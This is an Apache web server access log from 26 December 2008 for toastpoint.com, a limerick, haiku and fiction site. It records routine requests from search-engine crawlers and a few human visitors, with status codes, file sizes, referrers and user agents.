72.129.238.193 - - [26/Dec/2008:11:37:40 -0500] "GET /gifs/tpwinter20089.jpg HTTP/1.1" 200 28088 "http://www.toastpoint.com/news.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)"
81.52.143.16 - - [26/Dec/2008:11:58:08 -0500] "GET /haiku/?S=A HTTP/1.1" 403 563 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.26 - - [26/Dec/2008:12:07:03 -0500] "GET /limerick/naut299.html HTTP/1.1" 200 23095 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.16 - - [26/Dec/2008:12:20:35 -0500] "GET /limerick/1998/nice698.html HTTP/1.1" 200 24183 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
205.188.116.210 - - [26/Dec/2008:12:22:30 -0500] "GET /limerick/naut199.html HTTP/1.1" 200 34481 "http://www.google.com/search?hl=en&ie=ISO-8859-1&q=there+once+was+a+girl+named+monica" "Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
205.188.116.131 - - [26/Dec/2008:12:22:30 -0500] "GET /gifs/boobies.gif HTTP/1.1" 200 11144 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
205.188.117.206 - - [26/Dec/2008:12:22:30 -0500] "GET /gifs/nakedman.gif HTTP/1.1" 200 7734 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
205.188.116.139 - - [26/Dec/2008:12:22:31 -0500] "GET /gifs/goldstar.jpg HTTP/1.1" 200 1854 "http://www.toastpoint.com/limerick/naut199.html" "Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
205.188.116.136 - - [26/Dec/2008:12:24:52 -0500] "GET /limerick/nice199.html HTTP/1.1" 200 25313 "http://www.google.com/search?hl=en&ie=UTF-8&q=there+once+was+a+girl+named+monica+Limerick&start=10&sa=N" "Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
205.188.117.70 - - [26/Dec/2008:12:24:52 -0500] "GET /gifs/birdumb2.gif HTTP/1.1" 200 4698 "http://www.toastpoint.com/limerick/nice199.html" "Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
205.188.116.133 - - [26/Dec/2008:12:24:52 -0500] "GET /gifs/birdumb.gif HTTP/1.1" 200 4704 "http://www.toastpoint.com/limerick/nice199.html" "Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
208.80.194.45 - - [26/Dec/2008:12:28:10 -0500] "GET / HTTP/1.0" 200 464 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 3.1; PeoplePal 3.0)"
65.55.209.36 - - [26/Dec/2008:12:41:10 -0500] "GET /robots.txt HTTP/1.1" 404 693 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)"
65.55.209.36 - - [26/Dec/2008:12:41:12 -0500] "GET / HTTP/1.1" 304 - "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)"
81.52.143.15 - - [26/Dec/2008:12:43:40 -0500] "GET /limerick/?D=A HTTP/1.1" 403 563 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
66.249.72.35 - - [26/Dec/2008:12:45:53 -0500] "GET /haiku/haiku499.html HTTP/1.1" 200 54815 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
193.252.149.16 - - [26/Dec/2008:12:54:42 -0500] "GET /limerick/?N=A HTTP/1.1" 403 563 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
66.249.72.35 - - [26/Dec/2008:13:10:17 -0500] "GET /limerick/1996/nice196.html HTTP/1.1" 200 10647 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:11:46 -0500] "GET /fiction/novels/peak4.html HTTP/1.1" 200 13115 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:15:44 -0500] "GET /limerick/1996/nic1196.html HTTP/1.1" 200 11053 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:17:17 -0500] "GET /fiction/fict299.html HTTP/1.1" 200 38635 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:17:52 -0500] "GET /limerick/1996/naut796.html HTTP/1.1" 200 9432 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:17:55 -0500] "GET /limerick/1996/naut496.html HTTP/1.1" 200 21599 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:21:18 -0500] "GET /fiction/novels/parkey.html HTTP/1.1" 200 25723 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:21:21 -0500] "GET /fiction/novels/rosalind.html HTTP/1.1" 200 30989 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:23:42 -0500] "GET /limerick/haiku/haiku.html HTTP/1.1" 404 693 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:23:46 -0500] "GET /limerick/1996/nice496.html HTTP/1.1" 200 15372 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:26:44 -0500] "GET /limerick/1996/nice596.html HTTP/1.1" 200 13725 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:26:46 -0500] "GET /fiction/fict9596/fict9596.html HTTP/1.1" 200 1446 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:28:02 -0500] "GET /fiction/novels/peak3.html HTTP/1.1" 200 6906 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:28:04 -0500] "GET /limerick/1996/nau1096.html HTTP/1.1" 200 23475 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:28:07 -0500] "GET /limerick/fiction/fiction.html HTTP/1.1" 404 693 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:29:33 -0500] "GET /limerick/1996/nau1196.html HTTP/1.1" 200 14916 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:32:15 -0500] "GET /limerick/1996/nic1096.html HTTP/1.1" 200 9770 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:36:15 -0500] "GET /limerick/1995/1995.html HTTP/1.1" 200 1428 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:36:19 -0500] "GET /limerick/1996/naut596.html HTTP/1.1" 200 28755 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:36:20 -0500] "GET /limerick/1995/nicenov.html HTTP/1.1" 200 5429 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:36:21 -0500] "GET /limerick/1996/naut196.html HTTP/1.1" 200 38213 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:36:23 -0500] "GET /limerick/1996/bestnaut.html HTTP/1.1" 200 19352 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:37:19 -0500] "GET /limerick/1996/naut396.html HTTP/1.1" 200 17461 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:38:34 -0500] "GET /limerick/1996/nice896.html HTTP/1.1" 200 9880 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:38:35 -0500] "GET /limerick/1996/naut896.html HTTP/1.1" 200 14574 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:38:36 -0500] "GET /limerick/1995/bestnaut.html HTTP/1.1" 200 10247 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:40:05 -0500] "GET /fiction/novels/peak2.html HTTP/1.1" 200 15955 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:40:07 -0500] "GET /limerick/1996/nice396.html HTTP/1.1" 200 5682 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:40:12 -0500] "GET /limerick/1996/nice996.html HTTP/1.1" 200 4972 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:49:42 -0500] "GET /limerick/1996/nice696.html HTTP/1.1" 200 7043 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:51:01 -0500] "GET /fiction/fict499.html HTTP/1.1" 200 12868 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:51:03 -0500] "GET /fiction/fict199.html HTTP/1.1" 200 21503 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:57:53 -0500] "GET /limerick/1996/nice296.html HTTP/1.1" 200 9047 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:13:57:54 -0500] "GET /limerick/1996/naut296.html HTTP/1.1" 200 30357 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:00:28 -0500] "GET /haiku/haiku.html HTTP/1.1" 200 2147 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:02:18 -0500] "GET /limerick/1996/naut996.html HTTP/1.1" 200 13852 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:10:46 -0500] "GET /fiction/fict97/fict997.html HTTP/1.1" 200 4230 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:14:13 -0500] "GET /fiction/fict98/fict1198.html HTTP/1.1" 200 10372 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:16:52 -0500] "GET /fiction/fict98/fict498.html HTTP/1.1" 200 24373 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:20:00 -0500] "GET /fiction/fict98/fict698.html HTTP/1.1" 200 12890 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:20:55 -0500] "GET /fiction/fict98/fict1098.html HTTP/1.1" 200 61601 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:23:43 -0500] "GET /fiction/fict97/fict1297.html HTTP/1.1" 200 6078 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:25:18 -0500] "GET /limerick/1996/nice796.html HTTP/1.1" 200 10929 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:27:27 -0500] "GET /fiction/fict98/fict1298.html HTTP/1.1" 200 38294 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:29:07 -0500] "GET /fiction/fict98/fict298.html HTTP/1.1" 200 37545 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
216.183.81.221 - - [26/Dec/2008:14:33:24 -0500] "GET / HTTP/1.1" 304 - "-" "Wget/1.10.2"
217.169.46.98 - - [26/Dec/2008:14:44:07 -0500] "GET /limerick/naut199.html HTTP/1.1" 200 34481 "-" "Mozilla/4.0"
193.252.149.15 - - [26/Dec/2008:14:44:12 -0500] "GET /limerick/1998/nice398.html HTTP/1.1" 200 36584 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
66.249.72.35 - - [26/Dec/2008:14:44:52 -0500] "GET /fiction/fict98/fict398.html HTTP/1.1" 200 26221 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:14:47:08 -0500] "GET /fiction/fict98/fict598.html HTTP/1.1" 200 19208 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
65.55.209.254 - - [26/Dec/2008:14:49:31 -0500] "GET /robots.txt HTTP/1.1" 404 693 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)"
65.55.209.254 - - [26/Dec/2008:14:49:33 -0500] "GET /limerick/naut599.html HTTP/1.1" 304 - "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)"
66.249.72.35 - - [26/Dec/2008:14:49:42 -0500] "GET /fiction/fict399.html HTTP/1.1" 200 27729 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
72.30.65.29 - - [26/Dec/2008:15:01:24 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
66.249.72.35 - - [26/Dec/2008:15:01:56 -0500] "GET /limerick/1996/naut696.html HTTP/1.1" 200 13746 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:15:03:59 -0500] "GET /fiction/fict98/fict998.html HTTP/1.1" 200 7905 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:15:04:13 -0500] "GET /fiction/fict98/fict798.html HTTP/1.1" 200 40803 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.72.35 - - [26/Dec/2008:15:04:17 -0500] "GET /fiction/fict98/fict198.html HTTP/1.1" 200 62967 "-" "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
211.28.194.112 - - [26/Dec/2008:15:37:31 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
211.28.194.112 - - [26/Dec/2008:15:37:31 -0500] "GET /limerick/docs/fletcher.html HTTP/1.1" 200 5576 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
211.28.194.112 - - [26/Dec/2008:15:37:33 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
211.28.194.112 - - [26/Dec/2008:15:37:34 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
64.1.215.164 - - [26/Dec/2008:15:57:19 -0500] "GET /fiction/fict9596/fict9596.html HTTP/1.0" 200 1446 "-" "Mozilla/5.0 (Twiceler-0.9 http://www.cuil.com/twiceler/robot.html)"
72.36.115.86 - - [26/Dec/2008:16:02:09 -0500] "GET /haiku/1996/haik1096.html HTTP/1.1" 404 693 "-" "CazoodleBot/0.0.2 (http://www.cazoodle.com/contact.php; cbot@cazoodle.com)"
89.77.159.70 - - [26/Dec/2008:16:27:09 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
89.77.159.70 - - [26/Dec/2008:16:27:09 -0500] "GET /limerick/1996/nic1296.html HTTP/1.1" 200 19459 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
89.77.159.70 - - [26/Dec/2008:16:27:10 -0500] "GET /gifs/happy.jpg HTTP/1.1" 200 3135 "http://www.toastpoint.com/limerick/1996/nic1296.html" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
89.77.159.70 - - [26/Dec/2008:16:27:10 -0500] "GET /gifs/goldstar.jpg HTTP/1.1" 200 1854 "http://www.toastpoint.com/limerick/1996/nic1296.html" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
89.77.159.70 - - [26/Dec/2008:16:27:10 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
89.77.159.70 - - [26/Dec/2008:16:27:12 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
89.77.159.70 - - [26/Dec/2008:16:27:12 -0500] "GET /favicon.ico HTTP/1.1" 404 693 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5"
4.225.8.153 - - [26/Dec/2008:16:28:11 -0500] "GET / HTTP/1.1" 200 919088 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; GTB5; .NET CLR 1.1.4322)"
216.183.81.221 - - [26/Dec/2008:16:39:35 -0500] "GET / HTTP/1.1" 304 - "-" "Wget/1.10.2"
193.252.149.16 - - [26/Dec/2008:16:59:01 -0500] "GET /fiction/fiction.html HTTP/1.1" 200 2705 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
74.6.18.38 - - [26/Dec/2008:17:16:31 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.30.101 - - [26/Dec/2008:17:16:32 -0500] "GET / HTTP/1.0" 200 464 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.30.101 - - [26/Dec/2008:17:16:32 -0500] "GET /toastpointtopleft.html HTTP/1.0" 200 162 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.30.101 - - [26/Dec/2008:17:16:32 -0500] "GET /toastpointtoc.html HTTP/1.0" 200 1188 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.30.101 - - [26/Dec/2008:17:16:33 -0500] "GET /news.html HTTP/1.0" 200 17706 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.30.101 - - [26/Dec/2008:17:16:33 -0500] "GET /toastpointtopright.html HTTP/1.0" 200 151 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
74.6.30.101 - - [26/Dec/2008:17:16:33 -0500] "GET /tpnews.html HTTP/1.0" 200 8305 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
81.52.143.15 - - [26/Dec/2008:17:17:14 -0500] "GET /haiku/?M=A HTTP/1.1" 403 563 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.16 - - [26/Dec/2008:18:29:23 -0500] "GET /welcome.html HTTP/1.1" 200 418 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
217.212.224.183 - - [26/Dec/2008:19:23:15 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "psbot/0.1 (+http://www.picsearch.com/bot.html)"
217.212.224.184 - - [26/Dec/2008:19:23:16 -0500] "GET /limerick/1997/nice1297.html HTTP/1.0" 200 24100 "-" "psbot/0.1 (+http://www.picsearch.com/bot.html)"
216.183.81.221 - - [26/Dec/2008:19:39:13 -0500] "GET / HTTP/1.1" 304 - "-" "Wget/1.10.2"
81.52.143.15 - - [26/Dec/2008:19:39:32 -0500] "GET / HTTP/1.1" 200 464 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.15 - - [26/Dec/2008:19:39:53 -0500] "GET /toastpointtopright.html HTTP/1.1" 200 151 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.15 - - [26/Dec/2008:19:39:53 -0500] "GET /tpnews.html HTTP/1.1" 200 8305 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.15 - - [26/Dec/2008:19:39:53 -0500] "GET /toastpointtoc.html HTTP/1.1" 200 1188 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.15 - - [26/Dec/2008:19:39:53 -0500] "GET /toastpointtopleft.html HTTP/1.1" 200 162 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
81.52.143.15 - - [26/Dec/2008:19:39:53 -0500] "GET /news.html HTTP/1.1" 200 17706 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
67.195.37.167 - - [26/Dec/2008:19:56:29 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
67.195.37.167 - - [26/Dec/2008:19:56:29 -0500] "GET / HTTP/1.0" 200 464 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
67.195.37.167 - - [26/Dec/2008:19:56:30 -0500] "GET /toastpointtopleft.html HTTP/1.0" 200 162 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
67.195.37.167 - - [26/Dec/2008:19:56:30 -0500] "GET /toastpointtoc.html HTTP/1.0" 200 1188 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
67.195.37.167 - - [26/Dec/2008:19:56:31 -0500] "GET /news.html HTTP/1.0" 200 17706 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
